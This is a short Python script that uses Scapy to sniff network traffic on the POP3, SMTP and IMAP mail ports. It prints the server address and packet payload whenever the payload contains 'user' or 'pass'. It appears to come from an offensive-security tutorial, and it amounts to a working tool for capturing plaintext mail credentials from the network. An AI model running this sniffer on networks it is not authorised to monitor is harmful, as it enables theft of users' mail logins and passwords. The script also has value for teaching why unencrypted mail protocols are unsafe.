
from scapy.all import *
from scapy.layers.inet import TCP, IP
# our packet callback


def packet_callback(packet):
    # "show()" is a great way to debug scripts
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print "[*] Server: %s" % packet[IP].dst
            print "[*] %s" % packet[IP].payload

    print packet.show()

# fire up our sniffer
# sniff(filter="",iface="any",prn=function,count=N)
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)